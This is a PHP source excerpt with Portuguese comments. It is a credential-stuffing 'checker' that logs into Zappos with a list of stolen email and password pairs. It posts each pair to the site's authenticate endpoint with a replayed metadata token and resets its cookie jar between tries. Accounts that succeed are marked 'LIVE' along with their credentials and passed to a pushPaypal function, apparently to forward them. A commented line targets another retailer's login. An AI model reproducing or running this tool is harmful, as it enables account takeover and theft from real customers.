...
class cURL {
    ...
    function doRequest($method, $url) {
        ...
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ZAPPOS.txt'); //COOKIES  DO NAVEGADOR
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ZAPPOS.txt'); //COOKIES DO NAVEGADOR
        curl_setopt($ch, CURLOPT_REFERER, 'https://secure-www.zappos.com/login');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);                 
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'j_username='.$email.'&j_password='.$pwd.'&metadata1=bOqda%2BxN3CUsTFtyQAcNWl9ta2B9T%2BkSWDw8OZUhBgydwvvNCepf8NyR0yJ6R2NPjeT%2F59qwH0e6kE3Gu%2FYT43VdHy0RNUBbEScgfWk7XXN7hOn%2F8UR34bKdF1U7TcNN3gFg7tZxVPwBLBGyFkf9ifrn9yVOXXbayLaeVIBL4UikeacQ88%2BuCxGAlx%2B%2B320D36VHy1HolDxcePjunwnnX8X7VH58cDP%2F4V5Ko7PO0iVbAfEdCHcamKwJuJ%2B%2BysotacHLVBYaYhMvNuCjsbZklCgazGi1Uru1HBSsw6shFBYMPqzIi%2F1ky158BjyTia28i5mOT6i6Yu1DQvNDEnhUnE%2F0OjiEdhWqdTVvKpcRv5GuglVxPtRg4aLjbKwm66E04CfBTt%2Fe16JAk4yHbKZmlrzcd%2B5gk1lNgyUSuruZGBggdX3hgCkIQVGxBnhFAAJtsIcFVJMaSCseZV4DVHvFbBYOOhvLfxw1xRrrkMjzs%2FSzape%2Buts7znY%2FTVEYqesRJh%2BNWXGkHXsEaBcKjAdS8rWEYJLn8SZShDevr%2F3QtK3goDEwl%2Bzqk6QifXnaB%2FDPrAal6IKY%2F3aUTokm2%2BM2crPuSA4Q0OE7BjZ5Do9bohcSRWQ9oIsn8I24vD2vMXDfrOJd6RkMYWZzZk8fpdzOUgTrQ1H8%2FqOQ'); //POST DO LIVE REQUESST        
...
';
    ...
    foreach ($emails AS $k => $line) {
	 ...
	 //DELETAR COOKIES
if(file_exists(getcwd().'/ZAPPOS.txt')) {
        unlink(getcwd().'/ZAPPOS.txt'); 
    }
	//FIM COOKIES
	
	//CHAMADAS DE TOKEN E POST
	//$a = new cURL();
  //  $b = $a->get("https://secure.dafiti.com.br/customer/account/login/");//CHAMADA TOKEN
   // $token = getStr($b,"var csrfToken = '","';"); //CHAMADA TOKEN
	$c = new cURL();
    $d = $c->post("https://secure-www.zappos.com/authenticate"); //POST DA 2 CHAMADA
...
$checked++;
	...
	//RESULTADOS DE CAPUTRA
		if (stristr($d,'"firstName":') !== false) {
			...
			$cc4 = getStr($d,'"job":',',');
			$cc5 = str_replace(' \r\n','',$cc4);*/
			$xyz = "<b style=\"color:green\">LIVE</b> =>  <b style=\"color:blue\" >$email</b> | <b style=\"color:blue\">$pwd<b/> |  ";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
